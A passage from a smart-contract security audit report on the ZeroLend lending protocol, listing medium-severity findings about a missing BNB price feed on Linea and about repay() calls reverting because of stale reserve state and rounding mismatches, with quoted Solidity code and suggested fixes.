        if (supplyAssets + suppliedAssets > supplyCap) revert CuratedErrorsLib.SupplyCapExceeded(pool);

        // The market's loan asset is guaranteed to be the vault's asset because it has a non-zero supply cap.
        IERC20(asset()).forceApprove(address(pool), type(uint256).max);
        DataTypes.SharesType memory minted = pool.supplySimple(asset(), address(this), suppliedAssets, 0);
        emit CuratedEventsLib.ReallocateSupply(_msgSender(), pool, minted.assets, minted.shares);
        totalSupplied += suppliedAssets;
      }
    }

    if (totalWithdrawn != totalSupplied) revert CuratedErrorsLib.InconsistentReallocation();
  }
```

# Issue M-20: `BNB` token can't be used if ZEROLEND deploys on `Linea` because chainlink oracle price feed doesn't support it 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/460 

## Found by 
0xDemon
### Summary

Based on the contest `README`, 

> **On what chains are the smart contracts going to be deployed?**
Ethereum and Linea primarily. And after that any EVM-compatible network.
> 

and

> **If you are integrating tokens, are you allowing only whitelisted tokens to work with the codebase or any complying with the standard? Are they assumed to have certain properties, e.g. be non-reentrant? Are there any types of [[weird tokens](https://github.com/d-xo/weird-erc20)](https://github.com/d-xo/weird-erc20) you want to integrate?**
> 
> 
> Only standard ERC20 tokens + USDC and BNB are in-scope.
> 

The ZEROLEND protocol assumes that each chain that will be used to deploy the related smart contract has a price feed that supports each asset, but in reality, the chainlink oracle price feed does not support the `BNB` token on the `Linea` chain. This results in the `BNB` token being completely unusable and this breaks the main invariant that the `BNB` token is included in the token whitelist for each chain that will be supported (`Ethereum` mainnet, `Linea`, and `EVM-compatible networks`).

The main reason `BNB` is completely unusable is because when the pool is initiated and the address from the oracle is verified it will revert because the price feed is not available.

### Root Cause

The choice to use chainlink oracle price feed and assume there is a price feed for `BNB` on the `Linea` chain

[PoolGetters.sol:158-163](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/PoolGetters.sol#L158-L163)

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

`BNB` token being completely unusable and this breaks the main invariant that the `BNB` token is included in the token whitelist for each chain that will be supported (`Ethereum` mainnet, `Linea`, and `EVM-compatible networks`)

### PoC

All available chainlink oracle price feed for `Linea` chain can be seen [here](https://data.chain.link/feeds)

### Mitigation

Consider adding another price feed for `BNB` token if protocol still want to support `BNB` token



## Discussion

**nevillehuang**

Since it is explicitly stated in READ.ME that BNB + Linea chain is to be supported, I believe this is valid since READ.ME information overrides all other information. However, can also see arguments for invalidation based on admin configurations, will leave it to escalation discussions.

Note: See [here](https://data.chain.link/feeds) for chainlink feeds on linea chain

# Issue M-21: NFTPositionManager's `repay()` and `repayETH()` are unavailable unless preceded atomically by an accounting updating operation 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/467 

## Found by 
000000, A2-security, DenTonylifer, JCN, Obsidian, coffiasd, denzi\_, hyh, stuart\_the\_minion, thisvishalsingh, zarkk01
### Summary

The check in `_repay()` cannot be satisfied if pool state was not already updated by some other operation in the same block. This makes any standalone `repay()` and `repayETH()` calls revert, i.e. core repaying functionality can frequently be unavailable for end users since it's not packed with anything by default in production usage

### Root Cause


Pool state wasn't updated before `previousDebtBalance` was set:

[NFTPositionManager.sol#L115-L128](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManager.sol#L115-L128)

```solidity
  /// @inheritdoc INFTPositionManager
  function repay(AssetOperationParams memory params) external {
    if (params.asset == address(0)) revert NFTErrorsLib.ZeroAddressNotAllowed();
    IERC20Upgradeable(params.asset).safeTransferFrom(msg.sender, address(this), params.amount);
>>  _repay(params);
  }

  /// @inheritdoc INFTPositionManager
  function repayETH(AssetOperationParams memory params) external payable {
    params.asset = address(weth);
    if (msg.value != params.amount) revert NFTErrorsLib.UnequalAmountNotAllowed();
    weth.deposit{value: params.amount}();
>>  _repay(params);
  }
```

[NFTPositionManagerSetters.sol#L105-L121](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L105-L121)

```solidity
  function _repay(AssetOperationParams memory params) internal nonReentrant {
    if (params.amount == 0) revert NFTErrorsLib.ZeroValueNotAllowed();
    if (params.tokenId == 0) {
      if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();
      params.tokenId = _nextId - 1;
    }

    Position memory userPosition = _positions[params.tokenId];

    IPool pool = IPool(userPosition.pool);
    IERC20 asset = IERC20(params.asset);

    asset.forceApprove(userPosition.pool, params.amount);

>>  uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);
    DataTypes.SharesType memory repaid = pool.repay(params.asset, params.amount, params.tokenId, params.data);
>>  uint256 currentDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);
```

[PoolGetters.sol#L94-L97](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/PoolGetters.sol#L94-L97)

```solidity
  function getDebt(address asset, address who, uint256 index) external view returns (uint256 debt) {
    bytes32 positionId = who.getPositionId(index);
>>  return _balances[asset][positionId].getDebtBalance(_reserves[asset].borrowIndex);
  }
```

But it was updated in `pool.repay()` before repayment workflow altered the state:

[BorrowLogic.sol#L117-L125](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L117-L125)

```solidity
  function executeRepay(
    ...
  ) external returns (DataTypes.SharesType memory payback) {
    DataTypes.ReserveCache memory cache = reserve.cache(totalSupplies);
>>  reserve.updateState(params.reserveFactor, cache);
```

[ReserveLogic.sol#L87-L95](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L87-L95)

```solidity
  function updateState(DataTypes.ReserveData storage self, uint256 _reserveFactor, DataTypes.ReserveCache memory _cache) internal {
    // If time didn't pass since last stored timestamp, skip state update
    if (self.lastUpdateTimestamp == uint40(block.timestamp)) return;

>>  _updateIndexes(self, _cache);
    _accrueToTreasury(_reserveFactor, self, _cache);

    self.lastUpdateTimestamp = uint40(block.timestamp);
  }
```

[ReserveLogic.sol#L220-L238](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L220-L238)

```solidity
  function _updateIndexes(DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {
    ...
    if (_cache.currDebtShares != 0) {
      uint256 cumulatedBorrowInterest = MathUtils.calculateCompoundedInterest(_cache.currBorrowRate, _cache.reserveLastUpdateTimestamp);
      _cache.nextBorrowIndex = cumulatedBorrowInterest.rayMul(_cache.currBorrowIndex).toUint128();
>>    _reserve.borrowIndex = _cache.nextBorrowIndex;
    }
```

This way the `previousDebtBalance - currentDebtBalance` consists of state change due to the passage of time since last update and state change due to repayment:

[NFTPositionManagerSetters.sol#L105-L125](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L105-L125)

```solidity
  function _repay(AssetOperationParams memory params) internal nonReentrant {
    if (params.amount == 0) revert NFTErrorsLib.ZeroValueNotAllowed();
    if (params.tokenId == 0) {
      if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();
      params.tokenId = _nextId - 1;
    }

    Position memory userPosition = _positions[params.tokenId];

    IPool pool = IPool(userPosition.pool);
    IERC20 asset = IERC20(params.asset);

    asset.forceApprove(userPosition.pool, params.amount);

    uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);
    DataTypes.SharesType memory repaid = pool.repay(params.asset, params.amount, params.tokenId, params.data);
    uint256 currentDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);

>>  if (previousDebtBalance - currentDebtBalance != repaid.assets) {
      revert NFTErrorsLib.BalanceMisMatch();
    }
```

`previousDebtBalance` can be stale and, in general, it is `previousDebtBalance - currentDebtBalance = (actualPreviousDebtBalance - currentDebtBalance) - (actualPreviousDebtBalance - previousDebtBalance) = repaid.assets - {debt growth due to passage of time since last update} < repaid.assets`, where `actualPreviousDebtBalance` is `pool.getDebt()` result after `reserve.updateState()`, but before repayment

### Internal pre-conditions

Interest rate and debt are positive, so there is some interest accrual happens over time. This is normal (going concern) state of any pool

### External pre-conditions

No other state updating operations were run since the last block

### Attack Path

No direct attack needed in this case, a protocol malfunction causes loss to some users

### Impact

Core system functionality, `repay()` and `repayETH()`, are unavailable whenever aren't grouped with other state updating calls, which is most of the times in terms of the typical end user interactions. Since the operation is time sensitive and is typically run by end users directly, this means that there is a substantial probability that unavailability in this case leads to losses, e.g. a material share of NFTPositionManager users cannot repay in time and end up being liquidated as a direct consequence of the issue (i.e. there are other ways to meet the risk, but time and investigational effort are needed, while liquidations will not wait).

Overall probability is medium: interest accrues almost always and most operations are stand alone (cumulatively high probability) and repay is frequently enough called close to liquidation (medium probability). Overall impact is high: loss is deterministic on liquidation, is equal to liquidation penalty and can be substantial in absolute terms for big positions. The overall severity is high

### PoC

A user wants and can repay the debt that is about to be liquidated, but all the repayment transactions revert, being done straightforwardly at a stand alone basis, meanwhile the position is liquidated, bearing the corresponding penalty as net loss

### Mitigation

Consider adding direct reserve update before reading from the state, e.g.:

[NFTPositionManagerSetters.sol#L119](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L119)

```diff
+   pool.forceUpdateReserve(params.asset);
    uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);
```


# Issue M-22: The repayment process in the NFTPositionManager can sometimes be reverted 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/488 

## Found by 
Obsidian, dany.armstrong90, ether\_sky, hyh
## Summary
Users can `supply` `assets` to the `pools` through the `NFTPositionManager` to earn `rewards` in  `zero` tokens. 
Functions like `deposit`, `withdraw`, `repay`, and `borrow` should operate normally. 
However, due to an additional check, `repayments` might be reverted.
## Vulnerability Detail
Here's the relationship between `shares` (`s`) and `assets` (`a`) in the `Pool`:
-  **Share to Asset Conversion:**
   `a = [(s * I + 10^27 / 2) / 10^27] (rayMul)`
```solidity
function rayMul(uint256 a, uint256 b) internal pure returns (uint256 c) {
  assembly {
    if iszero(or(iszero(b), iszero(gt(a, div(sub(not(0), HALF_RAY), b))))) { revert(0, 0) }
    c := div(add(mul(a, b), HALF_RAY), RAY)
  }
}
```
- **Asset to Share Conversion:**
    `s = [(a * 10^27 + I / 2) / I] (rayDiv)`
```solidity
function rayDiv(uint256 a, uint256 b) internal pure returns (uint256 c) {
  assembly {
    if or(iszero(b), iszero(iszero(gt(a, div(sub(not(0), div(b, 2)), RAY))))) { revert(0, 0) }
    c := div(add(mul(a, RAY), div(b, 2)), b)
  }
}
```

**Numerical Example:**
Suppose there is a `pool` `P` where users `borrow` `assets` `A` using the `NFTPositionManager`.
- The current `borrow index` of `P` is `2 * 10^27`, and the `share` is `5`.
- The `previous debt balance` is as below (`Line 119`):
    `previousDebtBalance = [(s * I + 10^27 / 2) / 10 ^27] = [(5 * 2 * 10^27 + 10^27 / 2) / 10^27] = 10`
- If we are going to `repay` `3` `assets`:
    - The removed `shares` is:
        `[(a * 10^27 + I / 2) / I] = [(3 * 10^27 + 2 * 10^27 / 2) / (2 * 10^27)] = 2`
    - Therefore, the remaining `share` is:
        `5 - 2 = 3`
- The `current debt balance` is as below  (`Line 121`):
    `currentDebtBalance = [(s * I + 10^27 / 2) / 10 ^27] = [(3 * 2 * 10^27 + 10^27 / 2) / 10^27 = 6`
Then in `line 123`, `previousDebtBalance - currentDebtBalance` would be `4` and `repaid.assets` is `3`.
As a result, the `repayment` would be reverted.
```solidity
function _repay(AssetOperationParams memory params) internal nonReentrant {
119:  uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);

  DataTypes.SharesType memory repaid = pool.repay(params.asset, params.amount, params.tokenId, params.data);

121:  uint256 currentDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);
  
123:  if (previousDebtBalance - currentDebtBalance != repaid.assets) {
    revert NFTErrorsLib.BalanceMisMatch();
  }
}
```
This example demonstrates a `potential 1 wei mismatch` between `previousDebtBalance` and `currentDebtBalance` due to rounding in the calculations.
## Impact
This check seems to cause a `denial-of-service (DoS)` situation where `repayments` can fail due to small rounding errors. 
This issue can occur with various combinations of `borrow index`, `share amounts`, and `repaid assets`.
## Code Snippet
https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/utils/WadRayMath.sol#L77
https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/utils/WadRayMath.sol#L93
https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L119-L125
## Tool used

Manual Review

## Recommendation
Either remove this check or adjust it to allow a `1 wei mismatch` to prevent unnecessary reversion of `repayments`.

